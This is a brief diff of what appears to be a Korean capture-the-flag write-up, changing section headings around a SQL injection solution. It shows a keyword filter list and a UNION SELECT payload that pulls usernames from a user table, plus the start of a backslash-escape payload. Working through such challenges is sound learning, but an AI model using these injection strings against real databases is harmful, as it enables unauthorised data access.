@@ -146,7 +146,7 @@ filtering_list = ['or', 'and', '\'', '"', ' ']
 
 |
 
-## 문제 풀이
+## Exploit
 
 ```sql
 union select 1,(select username from user limit 1,1),3 #
@@ -170,8 +170,7 @@ union select 1,(select username from user limit 1,1),3 #
 
 |
 
-## Exploit
-
+## Payload
 ```python
 username: \
 
